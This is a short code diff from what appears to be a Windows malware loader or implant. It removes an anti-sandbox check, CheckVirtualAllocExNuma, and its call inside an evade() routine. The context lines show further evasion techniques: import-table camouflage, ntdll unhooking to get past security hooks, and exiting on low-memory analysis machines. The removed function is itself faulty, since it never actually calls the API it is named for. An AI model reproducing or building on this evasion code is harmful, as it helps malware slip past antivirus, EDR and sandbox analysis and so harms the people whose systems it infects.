@@ -106,14 +106,6 @@ VOID ModifiedIatCamouflage() {
     HeapFree(GetProcessHeap(), 0, pAddress);
 }
 
-BOOL CheckVirtualAllocExNuma(){
-    LPVOID mem = (LPVOID)(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
-    if (mem == NULL) {
-        return FALSE;
-    }
-    return TRUE;
-}
-
 void unhookNtdll(){
     HANDLE process = GetCurrentProcess();
 	MODULEINFO mi = {};
@@ -169,10 +161,6 @@ void evade() {
 	if (totalPhysicalMemoryInGB <= 1) {
 		exit(1);
 	}
-    
-    if (CheckVirtualAllocExNuma == FALSE) {
-        exit(1);
-    }
 };
 
 char uriError[] = "Error: Unable to retrieve the specified URI.\n";
